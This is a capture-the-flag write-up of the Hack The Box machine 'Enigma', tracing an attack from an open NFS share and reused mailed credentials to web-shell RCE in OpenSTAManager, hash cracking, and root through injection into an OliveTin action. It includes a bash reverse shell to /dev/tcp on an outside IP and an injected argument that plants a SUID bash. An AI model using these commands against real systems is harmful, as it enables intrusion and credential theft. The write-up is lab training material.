# Enigma (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Medium  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -p- enigma.htb → 22 (SSH, keys only), 80 (nginx)
├── 110/143/993/995 (Dovecot POP3/IMAP)
└── 111/2049 + mountd/nlockmgr (NFS)

Foothold (NFS)
├── showmount -e enigma.htb → /srv/nfs/onboarding *
├── mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
├── pdftotext New_Employee_Access.pdf → kevin:<PASSWORD>
└── /etc/hosts: 10.129.239.191 enigma.htb mail001.enigma.htb

Lateral Movement (Password Reuse + Mail)
├── IMAP: curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
├── Roundcube → sarah:<PASSWORD>
├── IT email → OpenSTAManager: admin:<PASSWORD>
└── /etc/hosts: support_001.enigma.htb

Exploitation (OpenSTAManager CVE-2025-69212)
├── Version: 2.9.8 (info.php)
├── OS Command Injection via P7M files (decodeP7M → exec without escaping)
├── ZIP with malicious filename → Sales → Invoices → Importazione FE
├── curl "http://support_001.enigma.htb/files/SHELL.php?c=id" → www-data
└── Reverse shell: nc -lvnp 4444

Lateral Movement (Config → MySQL → Hash)
├── config.inc.php → brollin / <PASSWORD>
├── mysql → SELECT username, password FROM zz_users
├── haris:$2y$... (bcrypt)
└── hashcat -m 3200 → haris:<PASSWORD>

User Flag
└── su haris → user.txt

Privilege Escalation (OliveTin)
├── ps aux → /usr/local/bin/OliveTin (root, 127.0.0.1:1337)
├── /etc/OliveTin/config.yaml → backup_database (shell: mysqldump {{ db_pass }})
├── Exploit: db_pass = "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"
└── /tmp/.bs -p → root
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

A multi-service Linux machine: mail server (Dovecot), NFS, Roundcube, OpenSTAManager, and a local OliveTin running as root.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -p- -oN nmap_full.txt enigma.htb
```

| Port | Service | Comment              |
|------|---------|----------------------|
| 22   | SSH     | OpenSSH 9.6, keys    |
| 80   | HTTP    | nginx                |
| 110  | POP3    | Dovecot              |
| 143  | IMAP    | Dovecot              |
| 993  | IMAPS   | Dovecot              |
| 995  | POP3S   | Dovecot              |
| 111  | rpcbind | NFS                  |
| 2049 | NFS     | NFS                  |

---

## Foothold (NFS)

```bash
showmount -e enigma.htb
# /srv/nfs/onboarding *

mkdir /tmp/nfs_enigma
sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
ls -la /tmp/nfs_enigma
pdftotext /tmp/nfs_enigma/New_Employee_Access.pdf -
```

Credentials:

- Username: `kevin`
- Password: `<PASSWORD>`
- Webmail: `http://mail001.enigma.htb`

---

## Lateral Movement (Password Reuse + Mail)

```bash
# /etc/hosts:
# 10.129.239.191 enigma.htb mail001.enigma.htb

curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
```

In INBOX - a welcome email from `sarah@enigma.htb`.

Roundcube: `http://mail001.enigma.htb`, login `sarah:<PASSWORD>`. In the mail - an IT email with access to OpenSTAManager:

- URL: `http://support_001.enigma.htb`
- Username: `admin`
- Password: `<PASSWORD>`

---

## Exploitation (OpenSTAManager)

```
http://support_001.enigma.htb/info.php → Version: 2.9.8
```

Vulnerable to **CVE-2025-69212** - OS Command Injection via P7M files.

Assemble a ZIP with a malicious filename, upload via Sales → Sales Invoices → Importazione FE.

RCE check:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# uid=33(www-data)
```

Reverse shell:

```bash
nc -lvnp 4444
echo -n 'bash -i >& /dev/tcp/10.10.14.160/4444 0>&1' | base64 -w0
curl -G "http://support_001.enigma.htb/files/SHELL.php" --data-urlencode 'c=echo <base64> | base64 -d | bash'
```

Stabilize:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement (Config → MySQL → Hash)

```bash
cat /var/www/html/openstamanager/config.inc.php
# $db_username = 'brollin';
# $db_password = '<PASSWORD>';

mysql -u brollin -p'<PASSWORD>' openstamanager
SELECT username, password FROM zz_users;

hashcat -m 3200 haris-hash /usr/share/wordlists/rockyou.txt --force
# haris:<PASSWORD>

su haris
cat ~/user.txt
```

---

## Privilege Escalation (OliveTin)

```bash
ps aux | grep root
# /usr/local/bin/OliveTin (root, 127.0.0.1:1337)

cat /etc/OliveTin/config.yaml
```

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

The `db_pass` parameter is substituted into the shell without escaping single quotes.

API:

```bash
curl -s -X POST "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard" \
  -H 'Content-Type: application/json' --data '{}'
```

Exploit:

```bash
cat > /tmp/backdoor.json <<'JSON'
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
JSON

curl -s -X POST -H 'Content-Type: application/json' \
  --data @/tmp/backdoor.json \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait | jq .
```

Root:

```bash
/tmp/.bs -p
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | (see `~/user.txt` for haris)     |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Unrestricted NFS** - always check `showmount -e`.
- **Password reuse** - temporary passwords are often not changed.
- **CVE hunting by version.**
- **Command injection via templating** - `{{ }}` in shell without sanitization.
- **Privileged local services** (OliveTin on 127.0.0.1) - a classic privesc vector.
